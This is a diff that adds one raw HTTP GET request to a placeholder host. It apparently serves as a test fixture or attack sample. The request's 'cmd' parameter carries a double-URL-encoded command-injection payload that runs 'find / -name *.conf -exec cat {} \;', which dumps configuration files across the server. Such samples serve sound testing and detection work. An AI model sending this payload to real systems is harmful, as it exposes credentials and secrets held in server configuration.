@@ -1,0 +1,4 @@
+GET /a?cmd=%253B%2Bfind%2B%252F%2B-name%2B%252A.conf%2B-exec%2Bcat%2B%257B%257D%2B%255C%253B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
